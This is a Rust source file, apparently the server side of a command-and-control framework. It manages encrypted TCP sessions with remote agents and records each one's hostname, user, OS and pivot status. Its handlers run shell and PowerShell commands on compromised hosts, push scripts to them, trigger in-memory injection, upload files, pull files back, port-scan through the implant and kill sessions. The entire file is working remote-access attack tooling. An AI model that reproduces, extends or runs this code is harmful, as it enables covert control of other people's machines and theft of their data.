use std::collections::HashMap;
use std::fs::File;
use base64::{Engine as _, engine::general_purpose};
use std::io::{BufReader, Read, Write};
use std::sync::Arc;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{Duration, timeout};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};
use rand::rngs::OsRng;
use simple_crypt::{encrypt, decrypt};

pub struct ConnectionInfo {
    pub id: usize,
    pub stream: Arc<Mutex<TcpStream>>,
    pub hostname: String,
    pub is_pivot: bool,
    pub username: String,
    pub os: String,
    pub shared_secret: [u8; 32],
}


pub async fn handle_importpsh(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err("Invalid command, expected 'import-psh ID SCRIPT_NAME'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let script_name = parts[2].trim();
    if id > active_connections.lock().await.len() {
        return Err("Invalid ID".to_string());
    }
    let script_file = match File::open(script_name) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error reading script file {}", script_name)),
    };
    let mut reader = BufReader::new(script_file);
    let mut buffer = Vec::new();
    let active_connections= active_connections.lock().await;
    reader.read_to_end(&mut buffer).unwrap();
    let encoded_script = general_purpose::STANDARD.encode(&buffer);

    let import_cmd = b"||IMPORTSCRIPT|| ";
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let encrypted_cmd = encrypt(import_cmd, &shared_secret).unwrap();
    let combined_command = format!("{}", encoded_script);

    stream.lock().await.write(&encrypted_cmd).await.expect("Error writing to stream");
    for chunk in combined_command.as_bytes().chunks(956) {
        let encrypted_command = encrypt(chunk, &shared_secret).expect("Failed to encrypt");
        stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
    }
    stream.lock().await.write(&encrypt(b" |!!done!!|", &shared_secret).unwrap()).await.expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");

    let mut message = [0; 1024];
    stream.lock().await.read(&mut message).await.expect("Error reading from stream");
    let data = decrypt(&message, &shared_secret).expect("Failed to decrypt");
    let response = match String::from_utf8(data) {
        Ok(response) => response,
        Err(_) => return Err("Error converting response to string".to_string()),
    };
    Ok(response)
}

pub async fn handle_run_script(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err(format!("Invalid command, expected '{} ID command'", parts[0]));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let function_name = parts[2].trim().to_string();
    let active_connections = active_connections.lock().await;

    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let command = format!("||RUNSCRIPT|| {}", function_name);

    let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    let mut cmdout = String::new();
    while !cmdout.contains("||cmd||") {
        let mut buffer = [0; 1024];
        let _ = match stream.lock().await.read(&mut buffer).await {
            Ok(n) => n,
            Err(_) => break,
        };
        let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
        cmdout.push_str(&String::from_utf8(data).unwrap());
    }
    cmdout = cmdout.replace("||cmd||", "");
    Ok(cmdout.trim().to_string())
}
pub async fn handle_in_memory(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(4, ' ').collect();
    if parts.len() < 3 {
        return Err(format!("Invalid command, expected '{} ID command'", parts[1]));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let path = parts[2].trim().to_string();
    let mut args_export = String::from("");
    if parts.len() == 4 {
        args_export = parts[3].trim().to_string()
    }
    let active_connections = active_connections.lock().await;

    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let command = format!("||INJECT|| {} {}", path, args_export);

    let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");

    let mut buffer = [0; 1024];
    stream.lock().await.read(&mut buffer).await.expect("Error reading from stream");
    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
    Ok(String::from_utf8(data).unwrap())
}
pub async fn parse_client_info(stream: &mut Arc<Mutex<tokio::net::TcpStream>>) -> (String, String, SharedSecret) {
    let mut rbuffer = [0; 1024];
    let mut stream_lock = stream.lock().await;
    let tcp_stream: &mut tokio::net::TcpStream = &mut *stream_lock;

    let secret = EphemeralSecret::random_from_rng(&mut OsRng);
    let public = PublicKey::from(&secret);
    let public_bytes = public.as_bytes().to_vec();
    let mut buffer = [0; 32];

    tcp_stream.write(&public_bytes).await.unwrap();
    tcp_stream.read(&mut buffer).await.unwrap();
    
    let shared_secret = secret.diffie_hellman(&PublicKey::from(buffer));
    let result = timeout(Duration::from_secs(3), tcp_stream.read(&mut rbuffer)).await;
    match result {
        Ok(Ok(_)) => {
            let data = decrypt(&rbuffer, shared_secret.as_bytes()).expect("Failed to decrypt");
            let data_string = String::from_utf8(data).expect("Failed to convert to String");
            let parts: Vec<&str> = data_string.split("||").collect();
            if parts[1] == "ACSINFO" {
                return (parts[2].to_string(), parts[3].to_string(), shared_secret);
            } else {
                return ("".to_string(), "".to_string(), shared_secret);
            }
        }
        Ok(Err(err)) => {
            panic!("Error reading from stream: {:?}", err);
        }
        Err(_) => {
            panic!("Read operation timed out");
        }
    }
}
pub async fn handle_command(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool)
    -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err(format!("Invalid command, expected '{} ID command'", parts[0]));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let command_str = parts[2].trim().to_string();
    let active_connections = active_connections.lock().await;

    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let command_prefix = if command.starts_with("psh") { "||PSHEXEC||" } else { "||CMDEXEC||" };
    
    let command = if raw_connection {
        format!("{}\n", command_str)
    } else {
        format!("{} {}", command_prefix, command_str)
    };
    
    let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    let mut cmdout = String::new();
    let mut buffer = [0; 65536];
    stream.lock().await.read(&mut buffer).await.expect("Error reading from stream");
    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
    if raw_connection {
        cmdout = String::from_utf8(data.to_vec()).unwrap();
    } else {
        while !cmdout.contains("||cmd||") {
            cmdout.push_str(&String::from_utf8(data.to_vec()).unwrap());
        }
        cmdout = cmdout.replace("||cmd||", "");
    }
    Ok(cmdout.trim().to_string())
}
pub async fn handle_list(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>) -> Vec<String> {
    let mut list = vec![String::new()];
    list.push("Active connections:\n".to_string());
    for (hostname, con) in active_connections.lock().await.iter() {
        if con.is_pivot {
            list.push(format!("[+] PIVOT: {} (ID {}) username: {}, OS: {}\n", hostname, con.id, con.username, con.os).to_string());
        } else {
            list.push(format!("[+] {} (ID {}) username: {}, OS: {}\n", hostname, con.id, con.username, con.os).to_string());
        }
    }
    list
}
pub async fn handle_upload(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
    if raw_connection {
        return Err("Upload command not supported for raw connections".to_string());
    }
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 4 {
        return Err("Invalid command, expected 'upload ID file destination'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let file_name = parts[2].trim();
    let destination = parts[3].trim();
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let file = match File::open(file_name) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error opening file {}", file_name)),
    };
    let mut reader = BufReader::new(file);
    let mut buffer = Vec::new();
    reader.read_to_end(&mut buffer).unwrap();
    let encoded_file = general_purpose::STANDARD.encode(&buffer);
    let upload_cmd = "||UPLOAD|| ".to_owned() + &destination;
    let (_,connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let upload_cmd = encrypt(upload_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream.lock().await.write(&upload_cmd).await.expect("Error writing to stream");
    
    let combined_command = format!("{} |!!done!!|", encoded_file.trim());
    for chunk in combined_command.as_bytes().chunks(956) {
        let encrypted_command = encrypt(chunk, &shared_secret).expect("Failed to encrypt");
        stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
    }
    
    stream.lock().await.flush().await.expect("Error flushing stream");
    let _ = match stream.lock().await.read(&mut buffer).await {
        Ok(n) => n,
        Err(_) => return Err("Error reading from stream".to_string()),
    };
    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
    let response = match String::from_utf8(data) {
        Ok(response) => response,
        Err(_) => return Err("Error converting response to string".to_string()),
    };
    Ok(response)
}
pub async fn handle_download(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
    if raw_connection {
        return Err("Download command not supported for raw connections".to_string());
    }
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 4 {
        return Err("Invalid command, expected 'download ID file destination'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let download_input = parts[2].trim();
    let filename = parts[3].trim();
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let download_cmd = "||DOWNLOAD|| ".to_owned() + &download_input;
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let download_cmd = encrypt(download_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
    
    stream.lock().await.write(&download_cmd).await.expect("Error writing to stream");
    let mut file = match File::create(filename) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error creating file: {}", filename)),
    };
    let mut buffer = [0; 1024];
    let mut encoded_data = String::new();
    loop {
        match stream.lock().await.read(&mut buffer).await {
            Ok(_) => {
                let decrypted_data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
                let data = match String::from_utf8(decrypted_data) {
                    Ok(data) => data,
                    Err(_) => return Err("Error converting data to string".to_string()),
                };
                encoded_data.push_str(&data);
                if data.contains("|!!done!!|") {
                    break;
                }
            }
            Err(err) => return Err(format!("Error receiving data: {}", err)),
        }
    }
    encoded_data = encoded_data.replace("\r", "").replace("\n", "").replace(" |!!done!!|", "");
    let decoded_data = match general_purpose::STANDARD.decode(&encoded_data) {
        Ok(decoded_data) => decoded_data,
        Err(err) => return Err(format!("Error decoding data: {}", err)),
    };
    match file.write_all(&decoded_data) {
        Ok(_) => Ok(format!("DOWNLOAD: File saved to {}.", filename)),
        Err(err) => Err(format!("Error writing to file: {}", err)),
    }
}
pub async fn handle_port_scan(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
    if raw_connection {
        return Err("Port scan command not supported for raw connections".to_string());
    }
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 5 {
        return Err("Invalid command, expected 'portscan ID ip start_port end_port'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => {
            return Err("Invalid ID".to_string());
        }
    };
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let ip = parts[2].trim();
    let num1 = parts[3];
    let num2 = parts[4];
    let port_scan_cmd = "||SCAN|| ".to_owned() + ip + " " + &num1 + " " + &num2;
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;
    let port_scan_cmd = encrypt(port_scan_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
    stream.lock().await
        .write(&port_scan_cmd).await
        .expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    let mut buffer = [0; 1024];
    let _ = stream.lock().await.read(&mut buffer).await.unwrap();
    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
    let response = String::from_utf8(data).unwrap();
    let factor = format!("{}:", ip);
    let mut ports: Vec<&str> = response.split(&factor).collect();
    ports.remove(0);
    let formatted_response = ports.join(", ");
    Ok(format!("IP {} has port {} open", ip, formatted_response))
}
pub async fn handle_kill(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => {
            return Err("Invalid ID".to_string());
        }
    };
    if parts.len() < 2 {
        return Err("Invalid command, expected 'kill ID'".to_string());
    }
    
    if !active_connections.lock().await.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }

    let active_connections = active_connections.lock().await;
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let shared_secret = connection_info.shared_secret;

    if raw_connection {
        stream.lock().await.write(b"exit\n").await.expect("Error writing to stream");
    } else {
        let cmd = encrypt(b"||EXIT||", &shared_secret).expect("Failed to encrypt");
        stream.lock().await.write(&cmd).await.expect("Error writing to stream");
    }
    stream.lock().await.flush().await.expect("Error flushing stream");
    Ok(format!("Kill command sent to {}.", id))
}
pub fn handle_exit() {
    println!("\nExiting");
    std::process::exit(0);
}
